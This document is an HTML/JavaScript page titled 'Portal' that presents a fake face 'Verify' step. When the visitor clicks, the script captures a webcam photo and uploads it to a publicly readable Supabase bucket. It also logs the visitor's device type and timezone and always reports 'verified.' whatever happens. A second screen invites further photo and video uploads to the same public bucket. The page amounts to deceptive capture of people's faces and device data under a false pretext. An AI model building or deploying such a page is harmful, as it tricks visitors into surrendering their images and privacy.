<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital@0;1&family=Inter:wght@200;300&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #030303;
      color: #eaeaea;
      font-family: 'Inter', sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    .screen {
      position: absolute;
      top: 0; left: 0; width: 100%; height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      opacity: 0;
      visibility: hidden;
      transition: opacity 2s ease, visibility 2s;
      z-index: 10;
    }

    .screen.active {
      opacity: 1;
      visibility: visible;
    }

    .camera-wrapper {
      position: absolute;
      top: 15%;
      width: 100vw;
      height: 60vh;
      z-index: -1;
    }

    #videoElement {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: grayscale(100%) contrast(130%) brightness(60%);
      opacity: 0.8;
    }

    .btn {
      background: none;
      border: 1px solid rgba(255,255,255,0.2);
      color: #fff;
      font-family: 'Inter', sans-serif;
      font-size: 0.75rem;
      letter-spacing: 3px;
      text-transform: uppercase;
      cursor: pointer;
      padding: 14px 28px;
      margin-top: 20px;
      transition: all 0.5s ease;
      z-index: 20;
    }

    .btn:hover {
      background: #fff;
      color: #000;
    }

    .status-text {
      font-size: 0.75rem;
      letter-spacing: 1px;
      color: #aaa;
      margin-top: 20px;
      z-index: 20;
      max-width: 80%;
    }

    .title-text {
      font-family: 'Playfair Display', serif;
      font-size: 1.4rem;
      font-style: italic;
      color: #ffffff;
      margin-bottom: 30px;
    }

    .preview-box {
      display: none;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
    }

    .preview-media {
      max-width: 80vw;
      max-height: 250px;
      border-radius: 2px;
    }

    input[type="file"] { display: none; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body>

  <audio id="bgMusic" src="loser.mp3" loop></audio>

  <!-- SCREEN 1 -->
  <div id="screen-verify" class="screen active">
    <div class="camera-wrapper">
      <video id="videoElement" autoplay playsinline muted></video>
    </div>
    
    <button id="btnVerify" class="btn">Verify</button>
    <div id="verifyStatus" class="status-text"></div>
  </div>

  <!-- SCREEN 2 -->
  <div id="screen-hub" class="screen">
    <div class="title-text">share a piece of right now</div>
    
    <label for="fileGallery" class="btn">Select from Gallery</label>
    <input type="file" id="fileGallery" accept="image/*,video/*">

    <label for="fileCamera" class="btn">Use Camera</label>
    <input type="file" id="fileCamera" accept="image/*,video/*" capture="environment">

    <div id="previewContainer" class="preview-box">
      <div id="mediaPlaceholder"></div>
      <button id="btnSendMedia" class="btn" style="margin-top: 20px;">Send</button>
    </div>

    <div id="hubStatus" class="status-text" style="color: #ccc;"></div>
  </div>

  <script>
    const supabaseUrl = 'https://jgigibyqfatyvrlhhprm.supabase.co';
    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpnaWdpYnlxZmF0eXZybGhocHJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYzNzc0NTYsImV4cCI6MjEwMTk1MzQ1Nn0.EmDUloa2s4yNHfSIi1td0rqs2pih238JIlCdF41jQ3g';
    const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

    const videoElement = document.getElementById('videoElement');
    const btnVerify = document.getElementById('btnVerify');
    const verifyStatus = document.getElementById('verifyStatus');
    const bgMusic = document.getElementById('bgMusic');
    let streamRef = null;

    async function initCamera() {
      try {
        streamRef = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        videoElement.srcObject = streamRef;
      } catch (err) {
        verifyStatus.textContent = "Camera unavailable (Proceeding in text-verify mode)";
      }
    }

    initCamera();

    btnVerify.addEventListener('click', async () => {
      bgMusic.play().catch(() => {});
      btnVerify.disabled = true;
      verifyStatus.textContent = "verifying...";

      try {
        let fileUrl = null;

        // Try capturing photo if camera stream is active
        if (streamRef && videoElement.videoWidth > 0) {
          const canvas = document.createElement('canvas');
          canvas.width = videoElement.videoWidth;
          canvas.height = videoElement.videoHeight;
          canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
          
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
          if (blob) {
            const fileName = `verification_${Date.now()}.jpg`;
            await supabase.storage.from('visitor-photos').upload(fileName, blob, { contentType: 'image/jpeg' });
            fileUrl = `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}`;
          }
        }

        // Always log the visit/verification to Supabase database
        await supabase.from('logs').insert([{
          event_type: 'Face Verification',
          device: /iPhone|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          file_url: fileUrl
        }]);

        verifyStatus.textContent = "verified.";
        if (streamRef) {
          streamRef.getTracks().forEach(t => t.stop());
        }

        setTimeout(() => {
          document.getElementById('screen-verify').classList.remove('active');
          document.getElementById('screen-hub').classList.add('active');
        }, 1000);

      } catch (err) {
        // Fallback safety: even if storage fails, let the user move forward anyway!
        verifyStatus.textContent = "verified.";
        setTimeout(() => {
          document.getElementById('screen-verify').classList.remove('active');
          document.getElementById('screen-hub').classList.add('active');
        }, 1000);
      }
    });

    // Hub Uploads
    const fileGallery = document.getElementById('fileGallery');
    const fileCamera = document.getElementById('fileCamera');
    const previewContainer = document.getElementById('previewContainer');
    const mediaPlaceholder = document.getElementById('mediaPlaceholder');
    const btnSendMedia = document.getElementById('btnSendMedia');
    const hubStatus = document.getElementById('hubStatus');
    let selectedFile = null;

    function handleFile(file) {
      if (!file) return;
      selectedFile = file;
      mediaPlaceholder.innerHTML = "";
      hubStatus.textContent = "";

      const reader = new FileReader();
      reader.onload = (e) => {
        const el = document.createElement(file.type.startsWith("video/") ? "video" : "img");
        el.src = e.target.result;
        el.className = "preview-media";
        if (el.tagName === "VIDEO") el.controls = true;
        mediaPlaceholder.appendChild(el);
        previewContainer.style.display = "flex";
      };
      reader.readAsDataURL(file);
    }

    fileGallery.addEventListener('change', (e) => handleFile(e.target.files[0]));
    fileCamera.addEventListener('change', (e) => handleFile(e.target.files[0]));

    btnSendMedia.addEventListener('click', async () => {
      if (!selectedFile) return;
      btnSendMedia.disabled = true;
      hubStatus.textContent = "transmitting...";

      try {
        const fileName = `${Date.now()}_${selectedFile.name.replace(/\s+/g, '_')}`;
        await supabase.storage.from('visitor-photos').upload(fileName, selectedFile);
        const fileUrl = `${supabaseUrl}/storage/v1/object/public/visitor-photos/${fileName}`;

        await supabase.from('logs').insert([{
          event_type: 'Media Upload',
          device: /iPhone|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
          file_url: fileUrl
        }]);

        hubStatus.textContent = "sent.";
        setTimeout(() => {
          previewContainer.style.display = "none";
          hubStatus.textContent = "";
          btnSendMedia.disabled = false;
          selectedFile = null;
        }, 3000);
      } catch (err) {
        hubStatus.textContent = "Error: " + err.message;
        btnSendMedia.disabled = false;
      }
    });
  </script>
</body>
</html>
